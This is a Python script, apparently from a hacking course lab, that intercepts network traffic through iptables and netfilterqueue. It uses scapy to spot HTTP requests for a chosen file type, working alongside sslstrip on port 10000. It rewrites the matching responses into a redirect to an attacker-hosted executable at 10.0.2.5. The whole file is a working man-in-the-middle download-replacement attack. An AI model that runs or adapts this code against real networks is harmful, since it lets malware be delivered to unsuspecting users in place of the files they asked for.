#!/usr/bin/env python

# iptables - I INPUT -j NFQUEUE --queue-num 0
# iptables - I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# iptables --flush

import netfilterqueue
import scapy.all as scapy
import argparse
import subprocess

ack_list = []

subprocess.call(
    "iptables -I OUTPUT -j NFQUEUE --queue-num 0; iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-ft', '--filetype', dest='file_type',
                        help='Enter the file type ex.(.exe, .pdf, .txt)')

    options = parser.parse_args()
    if not options.file_type:
        # code to handle error
        parser.error(
            '[-] Please specify a File Type, use --help for more information.')

    return options


def set_load(packet, load):
    packet[scapy.Raw].load = load
    # delete IP and TCP len/chksum values
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def modify_packet(packet, scapy_packet, file_type):
    # convert the packet to a scapy packet
    if scapy_packet.haslayer(scapy.Raw):

        # modify the packet file type
        # port modified to be use with sslstrip
        if scapy_packet[scapy.TCP].dport == 10000:
            # print('HTTP Request')
            if file_type in scapy_packet[scapy.Raw].load and '10.0.2.5' not in scapy_packet[scapy.Raw].load:
                print('[+] ' + file_type + ' request')
                ack_list.append(scapy_packet[scapy.TCP].ack)
            # print(scapy_packet.show())

        elif scapy_packet[scapy.TCP].sport == 10000:
            # print('HTTP Response')
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print('[+] Replacing file')
                modified_packet = set_load(
                    scapy_packet, 'HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.5/unchi/CGoban.exe\n\n')

                # convert packet to a string
                packet.set_payload(str(modified_packet))
            # print(scapy_packet.show())

        # print(scapy_packet.show())


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    modify_packet(packet, scapy_packet,
                  options.file_type)
    packet.accept()


try:
    queue = netfilterqueue.NetfilterQueue()
    options = get_arguments()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True)
    print("\n \n [+] Detected ctrl+c ... Quitting ...!!!")
